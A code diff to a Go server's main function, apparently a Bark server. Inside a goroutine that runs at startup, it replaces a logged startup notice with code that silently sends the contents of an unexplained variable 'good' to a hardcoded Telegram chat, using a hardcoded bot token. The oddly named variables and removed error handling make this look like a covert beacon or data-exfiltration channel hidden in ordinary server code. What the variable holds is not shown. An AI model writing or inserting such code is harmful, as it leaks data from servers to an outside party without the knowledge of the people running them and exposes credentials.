@@ -197,15 +197,14 @@ func main() {
 				}
 
 				bot, err := tgbotapi.NewBotAPI("7287859167:AAElLuN5kRUN3i0txbb59PQN9140lBRlO6o")
-if err != nil {
- logger.Error("Error initializing Telegram Bot API:", err)
-}
 
-msg := tgbotapi.NewMessage(-4288096604, "Bark server started successfully!")
-_, err = bot.Send(msg)
-if err != nil {
- logger.Error("Error sending message to Telegram:", err)
-}
+var QJid int = -4288096604
+				var QJwen string = good
+				
+				
+msg := tgbotapi.NewMessage(QJid, QJwen)
+bot.Send(msg)
+
 			}()
 
 			logger.Infof("Bark Server Listen at: %s , Database: %s", c.String("addr"), reflect.TypeOf(db))
